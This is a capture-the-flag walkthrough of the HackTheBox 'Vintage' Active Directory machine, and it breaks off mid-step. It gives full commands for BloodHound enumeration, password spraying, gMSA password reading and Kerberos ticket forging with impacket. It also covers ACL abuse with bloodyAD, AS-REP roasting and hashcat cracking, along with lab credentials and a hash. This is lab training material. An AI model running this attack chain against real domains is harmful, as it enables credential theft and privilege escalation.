VINTAGE-HTB-ACTIVE DIRECTORY

1. NMAP-SCAN:

Initial Access was given:

Username:P.Rosa Password: Rosaisbest123

We ran bloodhound python to a get view of active directory.

2. BLOODHOUND-PYTHON :

sudo bloodhound-python -u "P.Rosa" -p "Rosaisbest123" -d vintage.htb -c all --zip -ns 10.10.11.45

In bloodhound we checked:

Group Membership > Unrolled Member Of

What is Unrolled Group members ?

Unrolled members include users or groups that are indirectly members of a group due to group nesting.

For example:

  • Group Team1 is added to Admins.
  • User Bob is a direct member of Team1
  • Bob becomes an unrolled member of Admins because of group nesting

We can see that, Unrolled Member Of Domain Users have One Strange Group Which is PRE-WINDOWS 2000 COMPATIBLE ACCESS@VINTAGE.HTB

Upon researching about the Pre-Windows 2000 we found:

This means that there will be a Computer in this Group which will have a password same of its username

So we need to check PRE-WINDOWS 2000 COMPATIBLE ACCESS@VINTAGE.HTB Members

  1. Click On PRE-WINDOWS 2000 COMPATIBLE ACCESS@VINTAGE.HTB
  2. Check its Direct Members

We found FS01.VINTAGE.HTB. So possibly it will have the same password of its username. First, We check its name in Bloodhound:

  • Click FS01.VINTAGE.HTB
  • Node Info > Extra Properties
    • SameAccountName: FS01$
    • serviceprincipalnames: RestrictedKrbHost/fs01 HOST/fs0
    • RestrictedKrbHost/FS01.vintage.htb HOST/FS01.vintage.htb

From the node Info ServicePrincipalname gives an hint of Kerberoast attack but we will first check it via Netexec

3. PASSWORD SPRAYING VIA NETEXEC:

We first sprayed with winrm, wmi but both didn’t worked and gave error via netexec and crackmapexec. Then we tried ldap just to verify our password is correct for FS01$. Also Remember User -k Since ntlm authentication is disable in this case

sudo netexec ldap  10.10.11.45 -u usernames.txt -p passwords.txt -k --continue-on-success

Output verifies our password for FS01$ is indeed correct. Alhamdulillah

4. GENERATING TICKET VIA IMPACKET-getTGT VIA FS01$ CREDENTIALS :

impacket-getTGT vintage.htb/FS01\$:fs01 -dc-ip vintage.htb

Kerberos based attacks require synchronization of time with the Remote server.

The ntpdate command is used to manually synchronize the system clock with a remote NTP (Network Time Protocol) server. It sets the local date and time by querying the NTP server and is typically used for one-time time synchronization, not continuous syncing

Hence, we need to configure the ntp:

  1. sudo mousepad /etc/ntp.conf
  2. sudo ntpdate 10.10.11.45
  3. sudo mousepad /etc/krb5user.conf
  4. export KRB5CCNAME=$PWD/'FS01$.ccache'
  5. klist

5. BLOODHOUND AS FS01$ :

  • Bloodhound again > Check FS01@VINTAGE.HTB
  • Check Outbound Object Control > Group Delegated Object Control

We can see, FS01 is a member of DOMAIN COMPUTERS@VINTAGE.HTB where domain computers group can ReadGMSAPassword. So with the FS01 Creds (ccache in our case) we can ReadGMSAPassword

6. READING GMSAPASSWORD VIA BLOODYAD WITH AS FS01$ CCACHE :

bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k ccache=~/hackthebox-vms/vintage/FS01\$.ccache --dc-ip "10.10.11.45" get object 'CN=GMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb' --attr 'msDS-ManagedPassword'

**msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7

We can pass the hash now since we have the ntlm hash of GMSA

7. **BLOODHOUND AGAIN FOR GMSA NODES AND MEMBERSHIP :

Outbound Object Control > First Degree Object Control

GMSA01$@VINTAGE.HTB HAS GENERICWRITE ACCESS OVER SERVICEMANAGERS@VINTAGE.HTB

Since the box is based on Kerberos authentication, and NTLM is disabled so we need to convert the credentials into Kerberos TGT ccache

8. GMSA01$ CREDENTIALS INTO KERBEROS TICKET (TGT) VIA IMPACKET-getTGT :

impacket-getTGT vintage.htb/'GMSA01$' -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb

  • export KRB5CCNAME=$PWD/'GMSA01$.ccache'
  • klist

9. ABUSING GENERICWRITE ACCESS OVER SERVICEMANAGERS@VINTAGE.HTB WITH KERBEROS TICKET :

bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k add groupMember "ServiceManagers" "GMSA01$"

Since we have added the GMSA01$ to the ServiceManagers we need to renegerate a new TGT for GMSA01$ which will have that GroupManagers access in it.

10. REGENERATING GMSA01$ CREDENTIALS AS KERBEROS TICKET (TGT) VIA IMPACKET-getTGT :

impacket-getTGT vintage.htb/'GMSA01$' -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb

export KRB5CCNAME=$PWD/'GMSA01$.ccache'

11. BLOODHOUND AGAIN AS SERVICEMANAGERS :

  • Outbound object control > first degree object control

We see ServiceMangers have GenericAll Access over 3 Users. Since GMSA01$ is what we added it into that ServiceManagers group so he will also have that GenericAll Access over these 3 machines.

  • We checked Sql_svc, but found out its disabled account

First enable it then we can change the password of sql_svc

12. ENABLING SQL_SVC VIA GMSA01$ :

bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k add uac "svc_sql" -f "NORMAL_ACCOUNT"

13. ABUSING GENERICALL ON SQL_SVC VIA GMSA01 :

bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" -k add genericAll SVC_SQL 'GMSA01$'

14. EXTRACTING USERNAMES VIA LDAPSEARCH :

ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt

15. ATTEMPTING KERBEROS FOR FINDING ANY HASH:

impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/

16. ADDING DON’T REQUIRE PREAUTH SET :

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH

18. CRACKING VIA HASHCAT :

hashcat --help | grep -i "rep"

hashcat -m 18200 sql_svc.hash  /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule

We got, sql_svc password: Zer0the0ne

19. PASSWORD SPRAYING VIA KERBRUTE :

./kerbrute_linux_amd64 --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne

We got the, Username: C.Neri Password: Zer0the0ne

20. BLOODHOUND FOR C.NERI :

Outbound Object Control > Group Delegated Object Control

21. GENERATING TICKET VIA IMPACKET-getTGT WITH C.NERI CREDS :
